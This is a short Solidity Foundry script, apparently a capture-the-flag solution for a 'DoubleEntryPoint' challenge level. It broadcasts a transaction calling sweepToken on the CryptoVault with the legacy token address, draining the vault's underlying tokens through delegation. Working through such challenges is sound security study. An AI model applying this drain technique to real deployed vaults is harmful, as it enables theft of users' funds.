// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Script} from "forge-std/Script.sol";
import "../challenges/Ilevel26.sol";

contract POC is Script {
    DoubleEntryPoint level26 =
        DoubleEntryPoint(0xBDc7cd60eca4b6EA63A4e5A37d543Ff803B6D6DA);

    function run() external {
        uint256 deployer = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(deployer);

        CryptoVault vault = CryptoVault(level26.cryptoVault());
        address DET = address(vault.underlying());
        address LGT = level26.delegatedFrom();
        vault.sweepToken(IERC20(LGT)); //calling sweepToken with LGT address on the CryptoVault

        vm.stopBroadcast();
    }
}
